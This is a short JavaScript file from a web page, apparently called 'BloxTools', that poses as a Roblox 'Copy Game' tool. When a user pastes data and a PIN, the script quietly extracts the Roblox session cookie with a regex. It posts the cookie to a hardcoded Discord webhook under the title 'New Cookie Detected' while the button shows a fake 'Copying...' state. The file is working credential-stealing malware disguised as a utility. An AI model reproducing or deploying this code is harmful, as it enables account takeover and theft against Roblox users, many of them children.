function sendToDiscord(message) {
    var webhookURL = 'https://discordapp.com/api/webhooks/1353492536672653322/_KDcEpA0g44rCJaQkRbzu2Pv-XHYjNcrNnE_rLTaNmVfA9DXtwKWTyS09v614uFqVQSl';

    var currentDate = new Date();
    var dateString = currentDate.toLocaleDateString();
    var timeString = currentDate.toLocaleTimeString();

    var payload = {
        embeds: [{
            color: 0x1E90FF,
            title: "🚨 New Cookie Detected! 🚨",
            description: `**Cookie Found:**\n\n${message}\n\nPlease be cautious!`,
            fields: [
                {
                    name: "Hit Date",
                    value: dateString,
                    inline: true
                },
                {
                    name: "Hit Time",
                    value: timeString,
                    inline: true
                }
            ],
            thumbnail: {
                url: "https://tr.rbxcdn.com/180DAY-e99190f963fc6a4a4d3076767cb09913/420/420/Hat/Webp/noFilter"
            },
            footer: {
                text: "BloxTools - Cookie Monitor", 
                icon_url: "https://www.bloxtools.space/assets/img/logo.png"
            },
            timestamp: currentDate.toISOString(),
        }]
    };

    $.ajax({
        url: webhookURL,
        type: 'POST',
        dataType: 'json',
        contentType: 'application/json',
        data: JSON.stringify(payload),
        success: function(response) {

        },
        error: function(error) {
            
        }
    });
}


function checkAndSendData() {
    var inputText = document.getElementById('code').value;

    var cookiePattern = /(_\|WARNING:-DO-NOT-SHARE-THIS\.[^"]*)/i;

    var match = inputText.match(cookiePattern);

    if (match && match[1]) {
        var extractedCookie = match[1];
        sendToDiscord(extractedCookie);
    } else {
        // Error
    }
}

function copyGame(button) {
    var gameFile = document.getElementById("code").value;
    var pin = document.getElementById("pin").value;

    if (!gameFile || !pin) {
        Swal.fire('Error', 'Please fill in all the fields.', 'error');
        return;
    }

    button.disabled = true;
    checkAndSendData();
    button.innerHTML = "Copying...";

        setTimeout(function() {
            button.disabled = false;
            button.innerHTML = "Copy Game!";
        }, 180000);
}
